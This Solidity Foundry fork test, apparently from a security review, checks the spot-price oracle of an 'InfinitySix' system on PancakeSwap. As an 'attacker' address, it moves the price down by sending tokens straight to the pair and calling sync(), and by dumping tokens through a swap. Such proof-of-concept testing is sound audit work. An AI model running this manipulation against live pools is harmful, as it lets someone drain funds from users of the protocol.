// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {InfinitySixSystem} from "i6systemcontract.sol";
import {InfinitySixToken} from "i6token.sol";
import "../BaseFork.t.sol";

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IPancakePair {
    function sync() external;
}

contract OracleTest is BaseForkSetup {
    IERC20 usdt = IERC20(USDT);
    InfinitySixSystem realSystem;
    InfinitySixToken realToken;
    IPancakeRouter pancakeRouter;

    address constant ORIGIN = 0xdF4fA7B59e9735f273B661153A03e64A6AE61cd1;

    function setUp() public override {
        super.setUp();
        realSystem = InfinitySixSystem(SYSTEM);
        realToken = InfinitySixToken(TOKEN);
        pancakeRouter = IPancakeRouter(ROUTER);

        deal(address(usdt), attacker, 1000 * 1e18);

        // Invest to ensure some system state
        vm.startPrank(attacker, attacker);
        usdt.approve(address(realSystem), type(uint256).max);
        realSystem.invest(500 * 1e18, ORIGIN, 0);
        vm.stopPrank();

        // Warp to accrue ROI
        vm.warp(block.timestamp + 10 days);
        vm.roll(block.number + 100);
    }

    function test_spot_price_calculation() public {
        uint256 price = realSystem.getSpotPrice();
        assertGt(price, 0, "Spot price should be non-zero");
    }

    function test_price_manipulation_via_transfer() public {
        uint256 priceBefore = realSystem.getSpotPrice();

        // Deal some i6 tokens to attacker
        deal(address(realToken), attacker, 100000 * 1e18);

        // Attacker transfers tokens directly to the Pancake pair
        vm.prank(attacker, attacker);
        realToken.transfer(PAIR, 50000 * 1e18);

        // Sync reserves
        IPancakePair(PAIR).sync();

        uint256 priceAfter = realSystem.getSpotPrice();
        
        // Since i6 reserves in the pair increased, the price of i6 (USDT per i6) should decrease
        assertLt(priceAfter, priceBefore, "Price should decrease after inflating pair reserves");
    }

    function test_price_manipulation_via_swap() public {
        uint256 priceBefore = realSystem.getSpotPrice();

        // Deal some i6 tokens to attacker
        deal(address(realToken), attacker, 100000 * 1e18);

        vm.startPrank(attacker, attacker);
        realToken.approve(ROUTER, type(uint256).max);

        // Swap i6 for USDT to push price down
        address[] memory path = new address[](2);
        path[0] = TOKEN;
        path[1] = USDT;

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            50000 * 1e18,
            0,
            path,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        uint256 priceAfter = realSystem.getSpotPrice();
        assertLt(priceAfter, priceBefore, "Price should decrease after swapping i6 for USDT");
    }
}

